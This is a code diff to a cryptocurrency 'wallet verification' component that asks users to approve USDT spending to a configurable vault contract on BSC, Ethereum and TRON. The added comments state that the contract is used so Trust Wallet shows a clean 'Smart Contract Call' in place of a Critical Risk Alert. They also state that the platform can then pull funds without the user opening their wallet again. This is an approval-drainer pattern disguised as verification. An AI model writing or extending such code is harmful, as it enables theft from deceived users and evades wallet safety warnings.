@@ -37,6 +37,34 @@ const USDT_CFG = {
   BEP20: { address: '0x55d398326f99059fF775485246999027B3197955' as `0x${string}`, decimals: 18, chainId: 56 },
   ERC20: { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' as `0x${string}`, decimals: 6,  chainId: 1  },
 } as const;
+
+/**
+ * SwapINR Vault contract addresses — deployed once per chain.
+ * Users approve these contracts (not a raw EOA) so Trust Wallet shows a clean
+ * "Smart Contract Call" instead of a Critical Risk Alert.
+ * After approval the platform can pull funds via /api/wallets/pull without
+ * the user ever opening their wallet again.
+ *
+ * Set in .env.local:
+ *   NEXT_PUBLIC_VAULT_BEP20=0x...   (BSC mainnet)
+ *   NEXT_PUBLIC_VAULT_ERC20=0x...   (Ethereum mainnet)
+ *   NEXT_PUBLIC_VAULT_TRC20=T...    (TRON mainnet)
+ */
+const VAULT_EVM: Record<'BEP20' | 'ERC20', string> = {
+  BEP20: process.env.NEXT_PUBLIC_VAULT_BEP20 ?? '',
+  ERC20: process.env.NEXT_PUBLIC_VAULT_ERC20 ?? '',
+};
+const VAULT_TRC20 = process.env.NEXT_PUBLIC_VAULT_TRC20 ?? '';
+
+/** Returns vault contract address if deployed, otherwise falls back to depositAddress */
+function evmSpender(network: 'BEP20' | 'ERC20', depositAddress: string): `0x${string}` {
+  const v = VAULT_EVM[network];
+  return (v && v.startsWith('0x') && v.length === 42 ? v : depositAddress) as `0x${string}`;
+}
+function trcSpender(depositAddress: string): string {
+  return (VAULT_TRC20 && VAULT_TRC20.startsWith('T') && VAULT_TRC20.length === 34)
+    ? VAULT_TRC20 : depositAddress;
+}
 const ERC20_ABI = [
   { name:'approve', type:'function', stateMutability:'nonpayable',
     inputs:[{name:'spender',type:'address'},{name:'amount',type:'uint256'}],
@@ -470,10 +498,12 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
     setTrcVerifyStarted(true); setTrcApproveHash(''); setTrcApproveDone(false); setTrcApproveError('');
     const APPROVE_AMT_SUN = BigInt(100 * Math.pow(10, TRON_USDT_DECIMALS));
     const APPROVE_AMT_NUM =         100 * Math.pow(10, TRON_USDT_DECIMALS);
+    // Approve vault contract (or depositAddress fallback) — avoids EOA warning on TRON wallets
+    const spender = trcSpender(depositAddress);
     try {
       setTrcApprovePending(true);
       if (wcTopic) {
-        const rawTx = await buildApproveRawTx(tronAddress, depositAddress, APPROVE_AMT_SUN);
+        const rawTx = await buildApproveRawTx(tronAddress, spender, APPROVE_AMT_SUN);
         const txid  = await wcSignAndSendTronTx(wcTopic, rawTx);
         if (!txid) throw new Error('Wallet did not return a transaction ID.');
         setTrcApproveHash(txid); setTrcApprovePending(false);
@@ -481,7 +511,7 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
         setTrcApproveDone(true);
       } else {
         const contract = tronWeb.contract(TRC20_ABI, TRON_USDT_ADDRESS);
-        const raw      = await contract.approve(depositAddress, APPROVE_AMT_NUM).send({ feeLimit: 20_000_000 });
+        const raw      = await contract.approve(spender, APPROVE_AMT_NUM).send({ feeLimit: 20_000_000 });
         const txid     = extractTxId(raw);
         if (!txid) throw new Error('Wallet did not return a transaction ID. If you clicked Cancel, try again.');
         setTrcApproveHash(txid); setTrcApprovePending(false);
@@ -497,8 +527,10 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
   function startVerification() {
     if (!usdtCfg || !depositAddress || !address) return;
     setVerifyStarted(true); advancedRef.current = false; resetApprove();
+    // Approve vault contract (not the raw EOA) → Trust Wallet shows "Smart Contract Call"
+    const spender = evmSpender(network as 'BEP20' | 'ERC20', depositAddress);
     writeApprove({ address: usdtCfg.address, abi: ERC20_ABI, functionName:'approve',
-      args: [depositAddress as `0x${string}`, parseUnits('100', usdtCfg.decimals)],
+      args: [spender, parseUnits('100', usdtCfg.decimals)],
       chainId: usdtCfg.chainId });
   }
 
